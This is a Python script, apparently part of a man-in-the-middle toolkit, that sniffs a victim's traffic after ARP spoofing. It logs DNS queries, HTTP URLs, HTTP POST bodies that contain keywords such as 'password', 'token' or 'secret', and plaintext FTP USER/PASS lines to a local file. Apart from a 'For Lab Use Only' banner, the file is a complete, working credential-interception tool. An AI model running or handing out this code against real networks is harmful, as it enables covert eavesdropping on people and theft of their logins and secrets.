#!/usr/bin/env python3
"""
Traffic Sniffer — Captures HTTP, DNS, and credentials
Run AFTER arp_spoofer.py is active
"""

from scapy.all import sniff, IP, TCP, UDP, DNS, DNSQR, Raw
from datetime import datetime
import os
import sys
import re

# ─── Colors ────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
MAGENTA= "\033[95m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

LOG_FILE = "captured_traffic.txt"

def log(msg):
    """Write to log file."""
    with open(LOG_FILE, "a") as f:
        f.write(msg + "\n")

def banner():
    print(f"""
{CYAN}{BOLD}
 ███████╗███╗   ██╗██╗███████╗███████╗███████╗██████╗ 
 ██╔════╝████╗  ██║██║██╔════╝██╔════╝██╔════╝██╔══██╗
 ███████╗██╔██╗ ██║██║█████╗  █████╗  █████╗  ██████╔╝
 ╚════██║██║╚██╗██║██║██╔══╝  ██╔══╝  ██╔══╝  ██╔══██╗
 ███████║██║ ╚████║██║██║     ██║     ███████╗██║  ██║
 ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
{RESET}
{YELLOW}         [ MITM Traffic Interceptor — For Lab Use Only ]{RESET}
{CYAN}         [ Logging to: {LOG_FILE} ]{RESET}
""")

def process_packet(packet):
    timestamp = datetime.now().strftime("%H:%M:%S")

    # ── DNS Queries ──────────────────────────────────────
    if packet.haslayer(DNS) and packet.haslayer(DNSQR):
        try:
            domain = packet[DNSQR].qname.decode(errors="ignore").rstrip(".")
            src_ip = packet[IP].src if packet.haslayer(IP) else "unknown"
            msg = f"[{timestamp}] 🌐 DNS QUERY  |  {src_ip}  →  {domain}"
            print(f"{CYAN}{msg}{RESET}")
            log(msg)
        except Exception:
            pass

    # ── HTTP Traffic ─────────────────────────────────────
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        try:
            payload = packet[Raw].load.decode(errors="ignore")
            src_ip  = packet[IP].src
            dst_ip  = packet[IP].dst
            dport   = packet[TCP].dport
            sport   = packet[TCP].sport

            # HTTP Requests (GET/POST)
            if payload.startswith(("GET ", "POST ", "HEAD ", "PUT ")):
                # Extract URL
                first_line = payload.split("\r\n")[0]
                host_match = re.search(r"Host:\s*(.+)", payload, re.IGNORECASE)
                host = host_match.group(1).strip() if host_match else dst_ip

                method = first_line.split(" ")[0]
                path   = first_line.split(" ")[1] if len(first_line.split(" ")) > 1 else "/"
                url    = f"http://{host}{path}"

                msg = f"[{timestamp}] 🔗 HTTP {method:<4} |  {src_ip}  →  {url}"
                print(f"{GREEN}{msg}{RESET}")
                log(msg)

                # Credential hunting in POST body
                if "POST" in payload:
                    body = payload.split("\r\n\r\n", 1)[-1] if "\r\n\r\n" in payload else ""
                    cred_keywords = ["password", "passwd", "pass", "pwd",
                                     "username", "user", "email", "login",
                                     "token", "secret", "key", "auth"]
                    for kw in cred_keywords:
                        if kw.lower() in body.lower():
                            cred_msg = f"[{timestamp}] 🔑 CREDS FOUND | {src_ip} → {url}\n         Body: {body[:300]}"
                            print(f"{RED}{BOLD}{cred_msg}{RESET}")
                            log("=" * 60)
                            log(cred_msg)
                            log("=" * 60)
                            break

            # HTTP Responses — capture interesting headers
            elif payload.startswith("HTTP/"):
                first_line = payload.split("\r\n")[0]
                msg = f"[{timestamp}] 📥 HTTP RESP  |  {src_ip}  ←  {dst_ip}  [{first_line}]"
                print(f"{YELLOW}{msg}{RESET}")
                log(msg)

        except Exception:
            pass

    # ── FTP Credentials ──────────────────────────────────
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        try:
            payload = packet[Raw].load.decode(errors="ignore")
            src_ip  = packet[IP].src

            if packet[TCP].dport == 21 or packet[TCP].sport == 21:
                if payload.startswith(("USER ", "PASS ")):
                    msg = f"[{timestamp}] 🔑 FTP CRED   |  {src_ip}  →  {payload.strip()}"
                    print(f"{RED}{BOLD}{msg}{RESET}")
                    log(msg)
        except Exception:
            pass

def run_sniffer(interface=None, victim_ip=None):
    banner()

    # Build BPF filter
    bpf_filter = "ip"
    if victim_ip:
        bpf_filter = f"host {victim_ip}"
        print(f"{GREEN}[+] Filtering traffic for victim: {victim_ip}{RESET}")
    else:
        print(f"{YELLOW}[*] Sniffing ALL IP traffic (no victim filter){RESET}")

    print(f"{CYAN}[*] Starting sniffer... Press CTRL+C to stop\n{RESET}")
    log(f"\n{'='*60}")
    log(f"Session started: {datetime.now()}")
    log(f"{'='*60}\n")

    try:
        sniff(
            iface=interface,
            filter=bpf_filter,
            prn=process_packet,
            store=False
        )
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Stopping sniffer...{RESET}")
        print(f"{GREEN}[+] Traffic log saved to: {LOG_FILE} ✓{RESET}")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print(f"{RED}[!] Run as root: sudo python3 sniffer.py{RESET}")
        sys.exit(1)

    # Optional args: interface and victim IP
    interface  = sys.argv[1] if len(sys.argv) > 1 else None
    victim_ip  = sys.argv[2] if len(sys.argv) > 2 else None

    run_sniffer(interface, victim_ip)
